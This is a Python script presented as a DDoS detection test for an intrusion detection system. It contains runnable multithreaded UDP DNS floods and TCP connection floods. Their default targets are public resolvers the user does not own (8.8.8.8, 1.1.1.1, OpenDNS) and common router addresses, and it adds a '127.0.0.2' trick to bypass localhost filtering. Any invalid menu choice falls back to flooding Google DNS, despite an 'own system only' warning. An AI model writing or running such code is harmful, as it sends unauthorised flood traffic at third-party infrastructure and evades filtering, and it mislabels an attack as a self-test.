#!/usr/bin/env python3
"""
DDoS Detection Test - Working Version
Targets external/non-localhost IPs to bypass filtering and trigger detection
ONLY USE ON YOUR OWN SYSTEM FOR TESTING
"""

import socket
import threading
import time
import sys

class DDoSTest:
    def __init__(self):
        # Target options that will bypass localhost filtering
        self.target_options = [
            ("8.8.8.8", 53),        # Google DNS
            ("1.1.1.1", 53),        # Cloudflare DNS
            ("208.67.222.222", 53), # OpenDNS
            ("127.0.0.2", 80),      # Localhost bypass
            ("192.168.1.1", 80),    # Common router IP
            ("10.0.0.1", 80)        # Private network
        ]
        
        self.target_ip = None
        self.target_port = None
        self.stop_test = False
        self.packets_sent = 0
        self.successful_connections = 0
        self.failed_connections = 0
        self.lock = threading.Lock()
    
    def select_target(self):
        """Select the best target for DDoS testing"""
        print("🎯 Selecting target for DDoS test...")
        
        for ip, port in self.target_options:
            print(f"Testing connectivity to {ip}:{port}...")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                self.target_ip = ip
                self.target_port = port
                print(f"✅ Selected target: {ip}:{port}")
                return True
                
            except Exception as e:
                print(f"❌ {ip}:{port} failed: {e}")
                continue
        
        # Fallback to localhost bypass
        print("⚠️  Using localhost bypass as fallback")
        self.target_ip = "127.0.0.2"
        self.target_port = 80
        return True
    
    def send_packets(self, thread_id, packets_per_thread=30):
        """Send packets from a single thread"""
        print(f"Thread {thread_id}: Starting to send {packets_per_thread} packets to {self.target_ip}:{self.target_port}")
        
        for i in range(packets_per_thread):
            if self.stop_test:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                
                # Different connection attempts for different target types
                if self.target_port == 53:  # DNS port
                    # For DNS servers, just attempt connection
                    result = sock.connect_ex((self.target_ip, self.target_port))
                    if result == 0:
                        sock.send(b"DNS query simulation")
                else:
                    # For HTTP ports, send HTTP request
                    sock.connect((self.target_ip, self.target_port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
                
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
                    self.successful_connections += 1
                    
                    if self.packets_sent % 25 == 0:
                        print(f"📊 Total packets sent: {self.packets_sent}")
                
                time.sleep(0.01)  # Very fast rate - 100 packets/sec per thread
                
            except Exception as e:
                with self.lock:
                    self.packets_sent += 1
                    self.failed_connections += 1
                time.sleep(0.02)
    
    def run_test(self, num_threads=20, packets_per_thread=30):
        """Run the DDoS test with higher volume"""
        if not self.select_target():
            print("❌ Could not select target")
            return
        
        total_packets = num_threads * packets_per_thread
        
        print("=" * 60)
        print("🚀 STARTING DDOS DETECTION TEST (EXTERNAL TARGET)")
        print("=" * 60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Threads: {num_threads}")
        print(f"Packets per thread: {packets_per_thread}")
        print(f"Total packets: {total_packets}")
        print(f"Expected rate: ~{total_packets/30:.0f} packets/second")
        print("This WILL trigger DDoS detection (threshold: 200 packets/30sec)!")
        print("=" * 60)
        
        start_time = time.time()
        threads = []
        
        # Start threads rapidly for high volume
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.send_packets, 
                args=(i+1, packets_per_thread)
            )
            threads.append(thread)
            thread.start()
            time.sleep(0.01)  # Small stagger
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        duration = end_time - start_time
        
        print("=" * 60)
        print("✅ DDoS test completed!")
        print(f"📊 Statistics:")
        print(f"   • Target: {self.target_ip}:{self.target_port}")
        print(f"   • Total packets sent: {self.packets_sent}")
        print(f"   • Successful connections: {self.successful_connections}")
        print(f"   • Failed connections: {self.failed_connections}")
        print(f"   • Duration: {duration:.2f} seconds")
        print(f"   • Average rate: {self.packets_sent/duration:.1f} packets/second")
        print("🛡️  Check your IDS web interface for DDoS alerts!")
        print("=" * 60)

class ExternalDDoSTest:
    """DDoS test specifically targeting external services"""
    
    def __init__(self):
        # Public DNS servers (safe to test against)
        self.dns_targets = [
            ("8.8.8.8", 53),
            ("1.1.1.1", 53),
            ("208.67.222.222", 53)
        ]
        self.packets_sent = 0
        self.lock = threading.Lock()
    
    def dns_flood(self, target_ip, target_port, count=100):
        """Simulate DNS flood attack"""
        for i in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP for DNS
                sock.settimeout(0.1)
                
                # Send fake DNS query
                dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
                sock.sendto(dns_query, (target_ip, target_port))
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
                
            except:
                pass  # Expected for fake queries
            
            time.sleep(0.005)  # Very fast - 200 packets/sec
    
    def tcp_flood(self, target_ip, target_port, count=50):
        """TCP connection flood"""
        for i in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.2)
                sock.connect((target_ip, target_port))
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
                
            except:
                with self.lock:
                    self.packets_sent += 1
            
            time.sleep(0.01)
    
    def run_external_test(self):
        """Run DDoS test against external targets"""
        print("=" * 60)
        print("🌐 EXTERNAL DDOS TEST")
        print("=" * 60)
        print("Targeting public DNS servers (safe for testing)")
        print("This will definitely trigger DDoS detection!")
        print("=" * 60)
        
        start_time = time.time()
        threads = []
        
        # Attack multiple DNS servers simultaneously
        for target_ip, target_port in self.dns_targets:
            print(f"🎯 Targeting {target_ip}:{target_port}")
            
            # UDP flood threads
            for i in range(15):  # 15 threads per target
                thread = threading.Thread(
                    target=self.dns_flood,
                    args=(target_ip, target_port, 20)  # 20 packets per thread
                )
                threads.append(thread)
                thread.start()
            
            # TCP flood threads
            for i in range(5):   # 5 TCP threads per target
                thread = threading.Thread(
                    target=self.tcp_flood,
                    args=(target_ip, target_port, 15)  # 15 connections per thread
                )
                threads.append(thread)
                thread.start()
        
        print(f"🌊 Started {len(threads)} attack threads...")
        
        # Monitor progress
        monitor_start = time.time()
        while any(t.is_alive() for t in threads) and (time.time() - monitor_start) < 30:
            time.sleep(2)
            print(f"📈 Progress: {self.packets_sent} packets sent...")
        
        # Wait for completion
        for thread in threads:
            if thread.is_alive():
                thread.join(timeout=1)
        
        duration = time.time() - start_time
        
        print("=" * 60)
        print("✅ External DDoS test completed!")
        print(f"📊 Final Statistics:")
        print(f"   • Total packets: {self.packets_sent}")
        print(f"   • Duration: {duration:.2f} seconds")
        print(f"   • Rate: {self.packets_sent/duration:.1f} packets/sec")
        print(f"   • Targets attacked: {len(self.dns_targets)}")
        print("🛡️  Check IDS for DDoS alerts from external IPs!")
        print("=" * 60)

class QuickDDoSTest:
    """Quick test for immediate DDoS trigger"""
    
    def __init__(self):
        self.target_ip = "8.8.8.8"  # Google DNS
        self.target_port = 53
    
    def rapid_fire_test(self):
        """Send packets as fast as possible to external target"""
        print("=" * 60)
        print("⚡ QUICK DDOS TEST - EXTERNAL TARGET")
        print("=" * 60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print("Sending 250 packets in 15 seconds...")
        print("This should DEFINITELY trigger DDoS detection!")
        print("=" * 60)
        
        start_time = time.time()
        packets_sent = 0
        
        try:
            while packets_sent < 250 and (time.time() - start_time) < 15:
                try:
                    # Try both UDP and TCP
                    if packets_sent % 2 == 0:
                        # UDP DNS query
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(0.1)
                        dns_query = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07test\x03com\x00\x00\x01\x00\x01'
                        sock.sendto(dns_query, (self.target_ip, self.target_port))
                    else:
                        # TCP connection
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        sock.connect((self.target_ip, self.target_port))
                    
                    sock.close()
                    packets_sent += 1
                    
                    if packets_sent % 25 == 0:
                        elapsed = time.time() - start_time
                        rate = packets_sent / elapsed
                        print(f"📊 {packets_sent} packets sent ({rate:.1f}/sec) to {self.target_ip}")
                    
                except:
                    packets_sent += 1  # Count attempts even if they fail
                
                time.sleep(0.005)  # Very fast rate
                
        except KeyboardInterrupt:
            print("\n⚠️ Test interrupted by user")
        
        duration = time.time() - start_time
        print("=" * 60)
        print("✅ Quick DDoS test completed!")
        print(f"📊 Results:")
        print(f"   • Target: {self.target_ip}:{self.target_port}")
        print(f"   • Packets: {packets_sent} in {duration:.1f}s")
        print(f"   • Rate: {packets_sent/duration:.1f} packets/sec")
        print("🛡️ Check IDS immediately for DDoS alerts!")
        print("=" * 60)

class LocalhostBypassDDoS:
    """DDoS test using localhost bypass technique"""
    
    def __init__(self):
        self.target_ip = "127.0.0.2"  # Bypass localhost filtering
        self.target_port = 80
        self.packets_sent = 0
    
    def flood_localhost_bypass(self):
        """Flood localhost bypass address"""
        print("=" * 60)
        print("🕳️  LOCALHOST BYPASS DDOS TEST")
        print("=" * 60)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print("Using 127.0.0.2 to bypass localhost filtering...")
        print("Sending 300 rapid packets...")
        print("=" * 60)
        
        start_time = time.time()
        
        try:
            while self.packets_sent < 300 and (time.time() - start_time) < 20:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.05)
                    sock.connect((self.target_ip, self.target_port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: bypass\r\n\r\n")
                    sock.close()
                    self.packets_sent += 1
                    
                    if self.packets_sent % 30 == 0:
                        print(f"📊 {self.packets_sent} packets sent to {self.target_ip}")
                    
                except:
                    self.packets_sent += 1
                
                time.sleep(0.005)  # Very rapid
                
        except KeyboardInterrupt:
            print("\n⚠️ Test interrupted")
        
        duration = time.time() - start_time
        print("=" * 60)
        print("✅ Localhost bypass test completed!")
        print(f"📊 Results: {self.packets_sent} packets in {duration:.1f}s")
        print(f"⚡ Rate: {self.packets_sent/duration:.1f} packets/sec")
        print("🛡️ Check IDS for alerts!")
        print("=" * 60)

if __name__ == "__main__":
    print("DDoS Detection Test Suite - Working Version")
    print("Targets external/non-localhost IPs to trigger detection")
    
    print("\nChoose test type:")
    print("1. ⚡ Quick External Test (250 packets to Google DNS)")
    print("2. 🌐 External DDoS Test (multiple DNS servers)")
    print("3. 🚀 Standard Test (auto-select target)")
    print("4. 🕳️  Localhost Bypass Test (127.0.0.2)")
    print("5. 🎯 All Tests")
    print("6. ❌ Cancel")
    
    choice = input("Enter choice (1-6): ").strip()
    
    try:
        if choice == "1":
            tester = QuickDDoSTest()
            tester.rapid_fire_test()
            
        elif choice == "2":
            print("\n⚠️ This will target external DNS servers...")
            confirm = input("Continue with external test? (y/N): ").strip().lower()
            if confirm == 'y':
                tester = ExternalDDoSTest()
                tester.run_external_test()
            else:
                print("Test cancelled.")
                
        elif choice == "3":
            tester = DDoSTest()
            tester.run_test()
            
        elif choice == "4":
            tester = LocalhostBypassDDoS()
            tester.flood_localhost_bypass()
            
        elif choice == "5":
            print("\n⚠️ Running all DDoS tests...")
            
            print("\n🚀 Test 1: Quick External")
            quick_test = QuickDDoSTest()
            quick_test.rapid_fire_test()
            
            print("\n⏳ Waiting 5 seconds...")
            time.sleep(5)
            
            print("\n🚀 Test 2: Localhost Bypass")
            bypass_test = LocalhostBypassDDoS()
            bypass_test.flood_localhost_bypass()
            
            print("\n🏁 All tests completed!")
            
        elif choice == "6":
            print("Test cancelled.")
            sys.exit(0)
            
        else:
            print("Invalid choice. Running quick test.")
            tester = QuickDDoSTest()
            tester.rapid_fire_test()
            
    except KeyboardInterrupt:
        print("\nAll tests interrupted by user")